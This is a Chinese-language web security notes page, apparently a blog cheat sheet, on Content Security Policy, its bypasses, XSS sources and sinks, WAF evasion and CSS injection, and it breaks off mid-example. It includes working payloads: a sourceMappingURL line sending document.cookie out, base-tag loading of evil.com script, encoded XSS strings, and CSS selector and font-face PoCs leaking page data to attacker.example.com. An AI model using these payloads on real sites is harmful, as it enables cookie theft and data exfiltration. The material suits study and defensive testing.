id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> CSP</h1>\n<h2 id=\"csp是什么\"><a class=\"anchor\" href=\"#csp是什么\">#</a> CSP 是什么？</h2>\n<p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>\n<h2 id=\"配置\"><a class=\"anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。</p>\n<p>CSP 有三类：</p>\n<ul>\n<li>Content-Security-Policy (Google Chrome)</li>\n<li>X-Content-Security-Policy (Firefox)</li>\n<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>\n</ul>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HTTP header :</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\"Content-Security-Policy:\" 策略</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\"Content-Security-Policy-Report-Only:\" 策略</pre></td></tr></table></figure><p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>\n<p>HTML Meta :</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy-report-only<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"指令说明\"><a class=\"anchor\" href=\"#指令说明\">#</a> 指令说明</h3>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>default-src</td>\n<td>定义资源默认加载策略</td>\n</tr>\n<tr>\n<td>connect-src</td>\n<td>定义 Ajax、WebSocket 等加载策略</td>\n</tr>\n<tr>\n<td>font-src</td>\n<td>定义 Font 加载策略</td>\n</tr>\n<tr>\n<td>frame-src</td>\n<td>定义 Frame 加载策略</td>\n</tr>\n<tr>\n<td>img-src</td>\n<td>定义图片加载策略</td>\n</tr>\n<tr>\n<td>media-src</td>\n<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>object-src</td>\n<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>script-src</td>\n<td>定义 JS 加载策略</td>\n</tr>\n<tr>\n<td>style-src</td>\n<td>定义 CSS 加载策略</td>\n</tr>\n<tr>\n<td>base-uri</td>\n<td>定义 &lt;base&gt; 根 URL 策略，不使用 default-src 作为默认值</td>\n</tr>\n<tr>\n<td>sandbox</td>\n<td>值为 allow-forms，对资源启用 sandbox</td>\n</tr>\n<tr>\n<td>report-uri</td>\n<td>值为 /report-uri，提交日志</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"关键字\"><a class=\"anchor\" href=\"#关键字\">#</a> 关键字</h3>\n<ul>\n<li><code>-</code>\n<ul>\n<li>允许从任意 url 加载，除了  <code>data:</code>   <code>blob:</code>   <code>filesystem:</code>   <code>schemes</code></li>\n<li>e.g.  <code>img-src -</code></li>\n</ul>\n</li>\n<li><code>none</code>\n<ul>\n<li>禁止从任何 url 加载资源</li>\n<li>e.g.  <code>object-src 'none'</code></li>\n</ul>\n</li>\n<li><code>self</code>\n<ul>\n<li>只可以加载同源资源</li>\n<li>e.g.  <code>img-src 'self'</code></li>\n</ul>\n</li>\n<li><code>data:</code>\n<ul>\n<li>可以通过 data 协议加载资源</li>\n<li>e.g.  <code>img-src 'self' data:</code></li>\n</ul>\n</li>\n<li><code>domain.example.com</code>\n<ul>\n<li>e.g.  <code>img-src domain.example.com</code></li>\n<li>只可以从特定的域加载资源</li>\n</ul>\n</li>\n<li><code>\\*.example.com</code>\n<ul>\n<li>e.g.  <code>img-src \\*.example.com</code></li>\n<li>可以从任意 example.com 的子域处加载资源</li>\n</ul>\n</li>\n<li><code>https://cdn.com</code>\n<ul>\n<li>e.g.  <code>img-src https://cdn.com</code></li>\n<li>只能从给定的域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>https:</code>\n<ul>\n<li>e.g.  <code>img-src https:</code></li>\n<li>只能从任意域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>unsafe-inline</code>\n<ul>\n<li>允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签</li>\n<li>e.g.  <code>script-src 'unsafe-inline'</code></li>\n</ul>\n</li>\n<li><code>unsafe-eval</code>\n<ul>\n<li>允许一些不安全的代码执行方式，例如 js 的 eval ()</li>\n<li>e.g.  <code>script-src 'unsafe-eval'</code></li>\n</ul>\n</li>\n<li><code>nonce-&lt;base64-value&gt;'</code>\n<ul>\n<li>使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签</li>\n<li>e.g.  <code>script-src 'nonce-bm9uY2U='</code></li>\n</ul>\n</li>\n<li><code>&lt;hash-algo&gt;-&lt;base64-value&gt;'</code>\n<ul>\n<li>允许 hash 值匹配的代码块被执行</li>\n<li>e.g.  <code>script-src 'sha256-&lt;base64-value&gt;'</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"配置范例\"><a class=\"anchor\" href=\"#配置范例\">#</a> 配置范例</h3>\n<p>允许执行内联 JS 代码，但不允许加载外部资源</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'unsafe-inline'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<h3 id=\"预加载\"><a class=\"anchor\" href=\"#预加载\">#</a> 预加载</h3>\n<p>浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。</p>\n<p>HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个页面 --></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- firefox --></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prerender<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">&lt;!-- 预加载某个图片 --></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>prefetch<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>http://xxxx/x.jpg<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">&lt;!-- DNS 预解析 --></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>dns-prefetch<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://xxxx<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">&lt;!-- 特定文件类型预加载 --></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>preload<span class=\"token punctuation\">'</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">'</span>//xxxxx/xx.js<span class=\"token punctuation\">'</span></span><span class=\"token punctuation\">></span></span><span class=\"token comment\">&lt;!-- chrome --></span></pre></td></tr></table></figure><p>另外，不是所有的页面都能够被预加载，当资源类型如下时，将阻止预加载操作：</p>\n<ul>\n<li>URL 中包含下载资源</li>\n<li>页面中包含音频、视频</li>\n<li>POST、PUT 和 DELET 操作的 ajax 请求</li>\n<li>HTTP 认证</li>\n<li>HTTPS 页面</li>\n<li>含恶意软件的页面</li>\n<li>弹窗页面</li>\n<li>占用资源很多的页面</li>\n<li>打开了 chrome developer tools 开发工具</li>\n</ul>\n<h3 id=\"mime-sniff\"><a class=\"anchor\" href=\"#mime-sniff\">#</a> MIME Sniff</h3>\n<p>举例来说，csp 禁止跨站读取脚本，但是可以跨站读 img，那么传一个含有脚本的 img，再 <code>&lt;script href='http://xxx.com/xx.jpg'&gt;</code> ，这里 csp 认为是一个 img，绕过了检查，如果网站没有回正确的 mime type，浏览器会进行猜测，就可能加载该 img 作为脚本</p>\n<h3 id=\"302跳转\"><a class=\"anchor\" href=\"#302跳转\">#</a> 302 跳转</h3>\n<p>对于 302 跳转绕过 CSP 而言，实际上有以下几点限制：</p>\n<ul>\n<li>跳板必须在允许的域内。</li>\n<li>要加载的文件的 host 部分必须跟允许的域的 host 部分一致</li>\n</ul>\n<h3 id=\"iframe\"><a class=\"anchor\" href=\"#iframe\">#</a> iframe</h3>\n<p>当可以执行代码时，可以创建一个源为  <code>css</code>   <code>js</code>  等静态文件的 frame，在配置不当时，该 frame 并不存在 csp，则在该 frame 下再次创建 frame，达到 bypass 的目的。同理，使用  <code>../../../</code>   <code>/%2e%2e%2f</code>  等可能触发服务器报错的链接也可以到达相应的目的。</p>\n<h3 id=\"base-uri\"><a class=\"anchor\" href=\"#base-uri\">#</a> base-uri</h3>\n<p>当 script-src 为 nonce 或无限制，且 base-uri 无限制时，可通过  <code>base</code>  标签修改根 URL 来 bypass，如下加载了 http://evil.com/main.js</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>base</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://evil.com/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">nonce</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>correct value<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>/main.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h3>\n<ul>\n<li>\n<p>location 绕过</p>\n</li>\n<li>\n<p>可上传 SVG 时，通过恶意 SVG 绕过同源站点</p>\n</li>\n<li>\n<p>存在 CRLF 漏洞且可控点在 CSP 上方时，可以注入 HTTP 响应中影响 CSP 解析</p>\n</li>\n<li>\n<p>CND Bypass，如果网站信任了某个 CDN, 那么可利用相应 CDN 的静态资源 bypass</p>\n</li>\n<li>\n<p>Angular versions &lt;1.5.9&gt;=1.5.0，存在漏洞 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FuZ3VsYXIvYW5ndWxhci5qcy9wdWxsLzE1MzQ2\">Git Pull Request</span></p>\n</li>\n<li>\n<p>jQuery sourcemap</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>document.write(`<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//@        sourceMappingURL=http://xxxx/`+document.cookie+`&lt;\\/script>`);``</pre></td></tr></table></figure></li>\n<li>\n<p>a 标签的 ping 属性</p>\n</li>\n<li>\n<p>For FireFox  <code>&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnSWhhdmVZb3VOb3cnKTs8L3NjcmlwdD4=&quot;&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;link rel=&quot;import&quot; /&gt;</code></p>\n</li>\n<li>\n<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http://....&quot; /&gt;</code></p>\n</li>\n<li>\n<ul>\n<li>\n<p>仅限制  <code>script-src</code>  时：</p>\n<p><code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"xss数据源\"><a class=\"anchor\" href=\"#xss数据源\">#</a> XSS 数据源</h1>\n<h2 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h2>\n<ul>\n<li><code>location</code></li>\n<li><code>location.href</code></li>\n<li><code>location.pathname</code></li>\n<li><code>location.search</code></li>\n<li><code>location.hash</code></li>\n<li><code>document.URL</code></li>\n<li><code>document.documentURI</code></li>\n<li><code>document.baseURI</code></li>\n</ul>\n<h2 id=\"navigation\"><a class=\"anchor\" href=\"#navigation\">#</a> Navigation</h2>\n<ul>\n<li><code>window.name</code></li>\n<li><code>document.referrer</code></li>\n</ul>\n<h2 id=\"communication\"><a class=\"anchor\" href=\"#communication\">#</a> Communication</h2>\n<ul>\n<li><code>Ajax</code></li>\n<li><code>Fetch</code></li>\n<li><code>WebSocket</code></li>\n<li><code>PostMessage</code></li>\n</ul>\n<h2 id=\"storage\"><a class=\"anchor\" href=\"#storage\">#</a> Storage</h2>\n<ul>\n<li><code>Cookie</code></li>\n<li><code>LocalStorage</code></li>\n<li><code>SessionStorage</code></li>\n</ul>\n<h1 id=\"sink\"><a class=\"anchor\" href=\"#sink\">#</a> Sink</h1>\n<h2 id=\"执行javascript\"><a class=\"anchor\" href=\"#执行javascript\">#</a> 执行 JavaScript</h2>\n<ul>\n<li><code>eval(payload)</code></li>\n<li><code>setTimeout(payload, 100)</code></li>\n<li><code>setInterval(payload, 100)</code></li>\n<li><code>Function(payload)()</code></li>\n<li><code>&lt;script&gt;payload&lt;/script&gt;</code></li>\n<li><code>&lt;img src=x onerror=payload&gt;</code></li>\n</ul>\n<h2 id=\"加载url\"><a class=\"anchor\" href=\"#加载url\">#</a> 加载 URL</h2>\n<ul>\n<li><code>location=javascript:alert(/xss/)</code></li>\n<li><code>location.href=javascript:alert(/xss/)</code></li>\n<li><code>location.assign(javascript:alert(/xss/))</code></li>\n<li><code>location.replace(javascript:alert(/xss/))</code></li>\n</ul>\n<h2 id=\"执行html\"><a class=\"anchor\" href=\"#执行html\">#</a> 执行 HTML</h2>\n<ul>\n<li><code>xx.innerHTML=payload</code></li>\n<li><code>xx.outerHTML=payload</code></li>\n<li><code>document.write(payload)</code></li>\n<li><code>document.writeln(payload)</code></li>\n</ul>\n<h1 id=\"xss保护\"><a class=\"anchor\" href=\"#xss保护\">#</a> XSS 保护</h1>\n<h2 id=\"html过滤\"><a class=\"anchor\" href=\"#html过滤\">#</a> HTML 过滤</h2>\n<p>使用一些白名单或者黑名单来过滤用户输入的 HTML，以实现过滤的效果。例如 DOMPurify 等工具都是用该方式实现了 XSS 的保护。</p>\n<h2 id=\"x-frame\"><a class=\"anchor\" href=\"#x-frame\">#</a> X-Frame</h2>\n<p>X-Frame-Options 响应头有三个可选的值：</p>\n<ul>\n<li>DENY\n<ul>\n<li>页面不能被嵌入到任何 iframe 或 frame 中</li>\n</ul>\n</li>\n<li>SAMEORIGIN\n<ul>\n<li>页面只能被本站页面嵌入到 iframe 或者 frame 中</li>\n</ul>\n</li>\n<li>ALLOW-FROM\n<ul>\n<li>页面允许 frame 或 frame 加载</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"xss保护头\"><a class=\"anchor\" href=\"#xss保护头\">#</a> XSS 保护头</h2>\n<p>基于 Webkit 内核的浏览器 (比如 Chrome) 在特定版本范围内有一个名为 XSS auditor 的防护机制，如果浏览器检测到了含有恶意代码的输入被呈现在 HTML 文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来。</p>\n<p>而浏览器是否要拦截这段恶意代码取决于浏览器的 XSS 防护设置。</p>\n<p>要设置浏览器的防护机制，则可使用 X-XSS-Protection 字段 该字段有三个可选的值</p>\n<ul>\n<li><code>0</code>  : 表示关闭浏览器的 XSS 防护机制</li>\n<li><code>1</code>  : 删除检测到的恶意代码， 如果响应报文中没有看到 X-XSS-Protection 字段，那么浏览器就认为 X-XSS-Protection 配置为 1，这是浏览器的默认设置</li>\n<li><code>1; mode=block</code>  : 如果检测到恶意代码，在不渲染恶意代码</li>\n</ul>\n<p>FireFox 没有相关的保护机制，如果需要保护，可使用 NoScript 等相关插件。</p>\n<h1 id=\"waf-bypass\"><a class=\"anchor\" href=\"#waf-bypass\">#</a> WAF Bypass</h1>\n<ul>\n<li>\n<p>利用 &lt;&gt; 标记</p>\n</li>\n<li>\n<p>利用 html 属性</p>\n<ul>\n<li>href</li>\n<li>lowsrc</li>\n<li>bgsound</li>\n<li>background</li>\n<li>value</li>\n<li>action</li>\n<li>dynsrc</li>\n</ul>\n</li>\n<li>\n<p>关键字</p>\n<ul>\n<li>利用回车拆分</li>\n<li>字符串拼接\n<ul>\n<li><code>window[&quot;al&quot; + &quot;ert&quot;]</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>利用编码绕过</p>\n<ul>\n<li>base64</li>\n<li>jsfuck</li>\n<li>String.fromCharCode</li>\n<li>HTML</li>\n<li>URL</li>\n<li>hex\n<ul>\n<li><code>window[&quot;\\x61\\x6c\\x65\\x72\\x74&quot;]</code></li>\n</ul>\n</li>\n<li>unicode</li>\n<li>utf7\n<ul>\n<li><code>+ADw-script+AD4-alert('XSS')+ADsAPA-/script+AD4-</code></li>\n</ul>\n</li>\n<li>utf16</li>\n</ul>\n</li>\n<li>\n<p>大小写混淆</p>\n</li>\n<li>\n<p>对标签属性值转码</p>\n</li>\n<li>\n<p>产生事件</p>\n</li>\n<li>\n<p>css 跨站解析</p>\n</li>\n<li>\n<p>长度限制 bypass</p>\n<ul>\n<li><code>eval(name)</code></li>\n<li><code>eval(hash)</code></li>\n<li><code>import</code></li>\n<li><code>$.getScript</code></li>\n<li><code>$.get</code></li>\n</ul>\n</li>\n<li>\n<p><code>.</code></p>\n<ul>\n<li>使用  <code>。</code>  绕过 IP / 域名</li>\n<li><code>document['cookie']</code>  绕过属性取值</li>\n</ul>\n</li>\n<li>\n<p>过滤引号用  <code>`</code>  绕过</p>\n</li>\n</ul>\n<h1 id=\"技巧\"><a class=\"anchor\" href=\"#技巧\">#</a> 技巧</h1>\n<h2 id=\"httponly\"><a class=\"anchor\" href=\"#httponly\">#</a> httponly</h2>\n<ul>\n<li>在 cookie 为 httponly 的情况下，可以通过 xss 直接在源站完成操作，不直接获取 cookie。</li>\n<li>在有登录操作的情况下，部分站点直接发送登录请求可能会带有 cookie</li>\n<li>部分特定版本的浏览器可能会在 httponly 支持 / 处理上存在问题</li>\n<li>低版本浏览器支持 TRACE / TRACK，可获取敏感的 header 字段</li>\n<li>phpinfo 等页面可能会回显信息，这些信息中包含 http 头</li>\n<li>通过 xss 劫持页面钓鱼</li>\n<li>通过 xss 伪造 oauth 等授权请求，远程登录</li>\n</ul>\n<h2 id=\"css注入\"><a class=\"anchor\" href=\"#css注入\">#</a> CSS 注入</h2>\n<h3 id=\"基本介绍\"><a class=\"anchor\" href=\"#基本介绍\">#</a> 基本介绍</h3>\n<p>CSS 注入最早开始于利用 CSS 中的  <code>expression()</code>   <code>url()</code>   <code>regex()</code>  等函数或特性来引入外部的恶意代码，但是随着浏览器的发展，这种方式被逐渐禁用，与此同时，出现了一些新的攻击方式。</p>\n<h3 id=\"css-selectors\"><a class=\"anchor\" href=\"#css-selectors\">#</a> CSS selectors</h3>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='a']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/a<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='b']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/b<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token selector\">#form2 input[value^='c']</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token property\">background-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://localhost/log.php/c<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    [...]</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://example.com<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>form2<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>secret<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>abc<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>上图是利用 CSS selectors 完成攻击的一个示例</p>\n<h3 id=\"abusing-unicode-range\"><a class=\"anchor\" href=\"#abusing-unicode-range\">#</a> Abusing Unicode Range</h3>\n<p>当可以插入 CSS 的时候，可以使用  <code>font-face</code>  配合  <code>unicode-range</code>  获取目标网页对应字符集。PoC 如下</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?A<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched */</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0041<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?B<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* fetched too */</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token property\">unicode-range</span><span class=\"token punctuation\">:</span>U+0042<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token atrule\"><span class=\"token rule\">@font-face</span></span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token property\">font-family</span><span class=\"token punctuation\">:</span>poc<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token property\">src</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>http://attacker.example.com/?C<span class=\"token punctuation\">)</span></span><span class=\"token 